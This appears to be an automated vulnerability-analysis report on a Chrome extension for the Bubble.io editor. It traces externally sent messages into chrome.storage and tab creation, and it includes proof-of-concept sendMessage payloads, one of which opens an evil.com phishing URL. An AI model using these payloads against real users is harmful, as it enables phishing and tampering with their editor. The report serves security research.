# CoCo Analysis: fnmoehckfflkplnllpddbjjdhbmdoapc

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 5 (multiple flows to the same sink)

---

## Sink 1: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink (e.url)

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/fnmoehckfflkplnllpddbjjdhbmdoapc/opgen_generated_files/bg.js
Line 965     let e="https://www.nalfe.com/dashboard"...
    e.url
```

**Code:**

```javascript
// Background script (bg.js) - Line 965 (minified code, reformatted for clarity)
chrome.runtime.onMessageExternal.addListener(function(e, o, r) {
  return e.when ? "installed" === e.when && r(!0) :
    "show" === e.msg ? chrome.tabs.query({active:!0, currentWindow:!0}, function(o) {
      chrome.tabs.sendMessage(o[0].id, e.msg, function(e) { r(e) })
    }) :
    "check" === e.msg ? chrome.tabs.query({active:!0, currentWindow:!0}, function(o) {
      chrome.tabs.sendMessage(o[0].id, e.msg, function(e) { r(e) })
    }) :
    "goToPreview" === e.action ? a(e.url) : // ← attacker-controlled e.url flows to function a()
    "prepareAutoPaste" === e.action ? (
      console.log("check editor before prepare"),
      chrome.tabs.query({active:!0, currentWindow:!0}, function(o) {
        chrome.storage.local.set({nalfe_editorTab: o[0]}),
        chrome.tabs.sendMessage(o[0].id, {action:"showLoadingScreen"}),
        chrome.tabs.sendMessage(o[0].id, {action:"checkEditor"}, function(a) {
          // ... validation checks ...
          t(e.url, e.autopasteObj), // ← e.url passed to function t()
          r("Triggered prepareAutoPaste")
        })
      })
    ) : // ... other handlers ...
    !0
});

// Function t() stores e.autopasteObj to storage
t = async function(e, o) {
  return chrome.storage.local.get(["nalfe_editorTab"], function(r) {
    chrome.storage.local.set({nalfe_preparedAutoPasteObj: o}, function() { // ← stores attacker data
      console.log("prepareAutoPaste set local storage"),
      chrome.tabs.sendMessage(r.nalfe_editorTab.id, {action:"addIdAttribute"}, async function(o) {
        console.log("sendMessage: addIdAttribute: ", o),
        o.success && a(e) // ← e.url used to create tab
      })
    })
  }), !0
};

// Function r() creates tab with attacker-controlled URL
r = async function(e) {
  return console.log("createTab:", e),
  chrome.storage.local.get(["nalfe_editorTab"], function(o) {
    chrome.tabs.create({active:!0, url:e, index:o.nalfe_editorTab.index+1}, function(o) { // ← attacker URL opened
      chrome.storage.local.set({nalfe_previewTab:o, nalfe_previewURL:e}, function(){}) // ← URL stored
    })
  }), !0
};
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Messages via chrome.runtime.onMessageExternal

**Attack:**

```javascript
// From whitelisted domains: "https://www.nalfe.com/*" or "https://jasonelle-test.bubbleapps.io/*"
chrome.runtime.sendMessage(
  'fnmoehckfflkplnllpddbjjdhbmdoapc',
  {
    action: 'prepareAutoPaste',
    url: 'https://evil.com/malicious-page',
    autopasteObj: { array: [{ widget: true, type: 'malicious' }] }
  }
);
```

**Impact:** Attacker can inject arbitrary URLs and objects into chrome.storage.local, and cause the extension to open attacker-controlled URLs in new tabs. This enables phishing attacks where malicious pages are opened within the user's browser with the appearance of being extension-authorized. The stored data (nalfe_preparedAutoPasteObj, nalfe_previewURL) can be retrieved and used in subsequent operations, creating a complete storage exploitation chain.

---

## Sinks 2-5: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink (e.autopasteObj variants)

**CoCo Trace:**
```
Lines show multiple taints from e.autopasteObj, e.autopasteObj.array, and e.autopasteObj.array.find() results
flowing to chrome.storage.local.set()
```

**Code:**

Same external message handler as Sink 1, but focusing on the autopasteObj parameter:

```javascript
chrome.runtime.onMessageExternal.addListener(function(e, o, r) {
  // ...
  "prepareAutoPaste" === e.action ? (
    chrome.tabs.query({active:!0, currentWindow:!0}, function(o) {
      chrome.storage.local.set({nalfe_editorTab: o[0]}),
      chrome.tabs.sendMessage(o[0].id, {action:"checkEditor"}, function(a) {
        // Validation checks on e.autopasteObj.array
        e.autopasteObj.array.find(e => "api" === e.type) && !a.apiConnectorOn ?
          r(!1) :
        e.autopasteObj.array.find(e => "backend_workflow" === e.type) && !a.backendOn ?
          r(!1) :
        t(e.url, e.autopasteObj) // ← e.autopasteObj stored via function t()
      })
    })
  ) :
  "autoPaste" === e.action ? // ← Similar handling for autoPaste action
    chrome.tabs.query({active:!0, currentWindow:!0}, function(o) {
      chrome.tabs.sendMessage(o[0].id, e, function(e) { r(e) })
    })
  // ...
});

// Function t() stores the malicious autopasteObj
t = async function(e, o) {
  return chrome.storage.local.get(["nalfe_editorTab"], function(r) {
    chrome.storage.local.set({nalfe_preparedAutoPasteObj: o}, function() { // ← attacker-controlled object
      // ... uses stored object in subsequent operations
    })
  }), !0
};
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Messages via chrome.runtime.onMessageExternal

**Attack:**

```javascript
// From whitelisted domains
chrome.runtime.sendMessage(
  'fnmoehckfflkplnllpddbjjdhbmdoapc',
  {
    action: 'prepareAutoPaste',
    url: 'https://bubble.is/editor',
    autopasteObj: {
      array: [
        { widget: true, type: 'api', malicious: 'payload' },
        { widget: true, type: 'backend_workflow', evil: 'data' }
      ]
    }
  }
);
```

**Impact:** Attacker can inject malicious objects into chrome.storage.local (nalfe_preparedAutoPasteObj). The stored object is later retrieved and used to manipulate the Bubble.io editor, potentially injecting malicious code or configurations into the user's Bubble application. This represents a complete storage exploitation chain where poisoned data is both stored and subsequently retrieved for use in privileged operations affecting the Bubble.io editor environment.
